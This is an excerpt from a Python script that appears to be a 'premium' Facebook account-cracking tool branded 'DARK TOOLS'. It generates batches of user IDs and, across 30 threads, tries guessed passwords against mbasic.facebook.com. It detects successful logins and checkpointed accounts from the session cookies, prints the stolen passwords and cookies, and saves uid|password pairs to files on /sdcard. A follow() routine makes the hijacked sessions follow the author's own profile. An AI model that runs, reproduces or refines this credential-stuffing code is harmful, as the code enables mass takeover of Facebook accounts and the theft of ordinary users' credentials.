...
def o():
    ...
    DARK =input("\033[1;92m[\033[1;34m➢]\033[1;92mCHOOSE : ")
    if DARK == '1':
    	C1()
    if DARK == '2':
        C2()
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100092013160584', {
...
os.system('clear')
print('\x1b[1;32m             WELCOME TO MY DARK SIDE \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●')
time.sleep(5)
os.system('clear')
...
8    8 8     8 8 
`YooP' 8     8 8 
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO MY DARK TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
\033[1;32m[-] VERSION   :\033[1;32m 3.0
\033[1;32m[-] AUTHOR    :\033[1;32m DARK DEVIL  
\033[1;32m[-] GITHUB    :\033[1;32m OMIdark
\033[1;32m[-] FACEBOOK  :\033[1;32m OMI HASAN 
\033[1;92m══════════════════════════════════════════
\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS DARK  BRAND\033[;0m\033[1;91m═══>\033[1;92m """
...
def C2():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=30) as DARK :
        clear()
        tl = str(len(user))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;96m[\033[1;92m[DARK-OK]\033[1;96m[💚]\033[1;92m' +cid+'\033[1;92m●'+ps+'\033[1;94m<=>'+tahunng(cid))
                print ('\033[1;32m[‎🐸]\033[1;91m = \033[1;92m'+coki+ '')
                print ('\033[1;32m[‎💚]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
                cek_apk(session,coki)
                open('/sdcard/DARK-GMAIL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break 
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                ##print('\033[1;96m[DARKCP]\033[1;93m[😪]\033[1;96m'+cid+'='+ps+'\033[1;93m<=>'+tahunng(cid))
                print ('\033[1;32m[‎🍁]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
                open('/sdcard/DARK-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(uid)
                break          
            else:
                continue
        sys.stdout.write('\r%s[DARK-%s/%s] \033[1;92m[OK-%s][CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
    ...
    try:
        for ps in pwx:
        	...
        	header_freefb = {'authority': 'mbasic.facebook.com',
              ...
              'referer': 'https://mbasic.facebook.com/login/?li=HG4UZE-1fKQPWFgYnIi3kQpJ&e=1348029&shbl=1&refsrc=deprecated&_rdr',
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    print ('')
        	    print('\033[38;5;46m[\033[1;92mDARK\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
               ...
               ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
        	    cek_apk(session,coki)
        	    open('/sdcard/DARK-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	   # print('\033[1;96m[DARKCP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
              #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/DARK-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        loop+=1
        #sys.stdout.write('\r%s[DARK]%s/%s][OK-%s]\033[1;92m[CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.write('\r%s[DARK]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
